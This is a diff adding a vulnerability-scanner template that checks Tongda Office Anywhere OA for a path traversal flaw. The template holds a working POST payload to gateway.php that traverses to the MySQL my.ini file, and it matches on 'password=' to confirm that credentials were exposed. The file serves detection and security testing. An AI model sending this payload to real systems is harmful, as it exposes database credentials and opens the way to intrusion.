@@ -1,0 +1,35 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      json={"url":"/general/../../mysql5/my.ini"}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '[mysql]'
+          - password=
+        condition: and
+      - type: word
+        part: header
+        words:
+          - text/html
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/ispirit/interface/gateway.php'
+id: tongda-path-traversal
+info:
+  author: pikpikcu
+  description: |
+    Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Office Anywhere TongDa - Path Traversal
+  severity: high
+  tags: tongda,oa,path,traversal,argus-import
